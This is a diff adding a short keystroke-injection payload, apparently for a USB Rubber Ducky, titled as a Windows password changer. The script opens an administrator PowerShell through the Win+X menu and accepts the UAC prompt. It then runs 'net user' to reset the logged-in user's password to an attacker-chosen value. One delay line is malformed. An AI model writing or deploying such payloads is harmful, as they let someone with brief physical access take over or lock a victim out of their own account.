@@ -1,0 +1,21 @@
+REM Windows Password Change By ANgry
+
+REM You must define the new Windows user password
+DEFINE NEW_PASSWORD password
+
+DELAY 1000
+GUI x
+DELAY 500
+STRING a
+DELAY 500z
+LEFT_ARROW
+DELAY 500
+ENTER
+
+DELAY 2000
+STRING net user $env:USERNAME 
+STRING NEW_PASSWORD
+ENTER
+DELAY 1000
+
+ALT F4
